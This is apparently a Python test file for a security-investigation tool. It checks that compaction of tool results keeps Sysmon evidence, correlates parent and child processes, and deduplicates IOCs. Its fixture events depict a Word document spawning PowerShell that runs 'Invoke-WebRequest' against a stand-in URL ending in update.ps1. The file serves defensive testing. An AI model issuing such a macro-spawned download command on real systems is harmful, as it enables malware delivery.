from copy import deepcopy
from datetime import datetime, timedelta, timezone

from cybercopilot.correlation import correlate_process_activity
from cybercopilot.model_context import compact_tool_result
from cybercopilot.schemas import EvidenceRef, EventRecord


BASE = datetime(2026, 9, 18, 13, 50, tzinfo=timezone.utc)
REF = EvidenceRef(
    artifact_id="art-parent-child",
    event_id="evt-placeholder",
    locator="Sysmon Event ID 1 / Record 5001",
    sha256="a" * 64,
)


def event(event_id: str, code: str, seconds: int, **event_data) -> EventRecord:
    return EventRecord(
        event_id=event_id,
        case_id="case-parent-child",
        timestamp=BASE + timedelta(seconds=seconds),
        timestamp_source="fixture",
        source_type="sysmon",
        source_name="sysmon-parent-child.xml",
        host="LAB-WS05",
        event_code=code,
        category="sysmon",
        action={"1": "process_create", "3": "network_connect", "22": "dns_query"}[code],
        fields={
            "system": {"record_id": str(5000 + int(event_id[-1]))},
            "event_data": event_data,
        },
        evidence_refs=[REF.model_copy(update={"event_id": event_id})],
    )


def fixture_events() -> list[EventRecord]:
    return [
        event("evt-1", "1", 0, ProcessId="7000", Image="WINWORD.EXE", CommandLine="WINWORD.EXE invoice.docm"),
        event(
            "evt-2", "1", 3, ProcessId="7010", ParentProcessId="7000",
            ParentImage="WINWORD.EXE", Image="powershell.exe",
            CommandLine="powershell.exe -Command Invoke-WebRequest https://example.com/update.ps1",
        ),
        event("evt-3", "22", 5, ProcessId="7010", QueryName="example.com"),
        event("evt-4", "3", 6, ProcessId="7010", DestinationIp="203.0.113.25", DestinationPort="443", Protocol="tcp"),
    ]


def test_query_compaction_keeps_critical_evidence_and_does_not_mutate_raw():
    raw = {
        "ok": True,
        "tool": "query_events",
        "call_id": "call-query",
        "data": {
            "trust": "untrusted_evidence",
            "count": 4,
            "events": [item.model_dump(mode="json") for item in fixture_events()],
        },
    }
    original = deepcopy(raw)

    compact = compact_tool_result(raw)

    assert raw == original
    for required in (
        "evt-1", "evt-2", "evt-3", "evt-4", "record=5001",
        "LAB-WS05", "pid=7010", "parent_pid=7000",
        "example.com", "203.0.113.25", "artifact=art-parent-child",
        "sha256=" + "a" * 64,
    ):
        assert required in compact
    assert compact.count("EVENT id=evt-1") == 1
    assert compact.count("EVENT id=evt-4") == 1


def test_correlation_compaction_preserves_parent_basis_activity_and_warning():
    raw = {
        "ok": True,
        "tool": "correlate_activity",
        "data": {
            "case_id": "case-parent-child",
            **correlate_process_activity(fixture_events()),
        },
    }

    compact = compact_tool_result(raw)

    assert "parent_event=evt-1" in compact
    assert "parent_basis=pid_temporal_fallback" in compact
    assert "ACTIVITY event=evt-3" in compact
    assert "ACTIVITY event=evt-4" in compact
    assert "basis=pid_temporal_fallback" in compact
    assert "WARNING Some relationships use bounded PID/time correlation" in compact


def test_ioc_compaction_preserves_authoritative_types_and_deduplicates_values():
    raw = {
        "ok": True,
        "tool": "extract_iocs",
        "data": {
            "count": 4,
            "observables": [
                {
                    "observable_id": "obs-domain-a", "type": "domain", "value": "example.com",
                    "normalized_value": "example.com", "internal": None,
                    "evidence_refs": [REF.model_dump(mode="json")],
                },
                {
                    "observable_id": "obs-domain-b", "type": "domain", "value": "example.com",
                    "normalized_value": "example.com", "internal": None,
                    "evidence_refs": [REF.model_dump(mode="json")],
                },
                {
                    "observable_id": "obs-url", "type": "url", "value": "https://example.com/update.ps1",
                    "normalized_value": "https://example.com/update.ps1", "internal": None,
                    "evidence_refs": [REF.model_dump(mode="json")],
                },
                {
                    "observable_id": "obs-ip", "type": "ipv4", "value": "203.0.113.25",
                    "normalized_value": "203.0.113.25", "internal": False,
                    "evidence_refs": [REF.model_dump(mode="json")],
                },
            ],
        },
    }

    compact = compact_tool_result(raw)

    assert "IOCS count=3" in compact
    assert "type=domain value=example.com" in compact
    assert "type=url value=https://example.com/update.ps1" in compact
    assert "type=ipv4 value=203.0.113.25 internal=false" in compact
    assert "update.ps1" not in compact.split("type=domain", 1)[1].split("\n", 1)[0]
    assert compact.count("type=domain value=example.com") == 1


def test_important_tool_errors_remain_model_visible():
    compact = compact_tool_result(
        {
            "ok": False,
            "tool": "query_events",
            "code": "invalid_arguments",
            "message": "Tool arguments failed schema validation.",
            "errors": [{"loc": ["limit"], "msg": "Input should be <= 1000"}],
        }
    )

    assert compact.startswith("TOOL query_events error")
    assert "ERROR code=invalid_arguments" in compact
    assert "validation[limit]=Input should be <= 1000" in compact
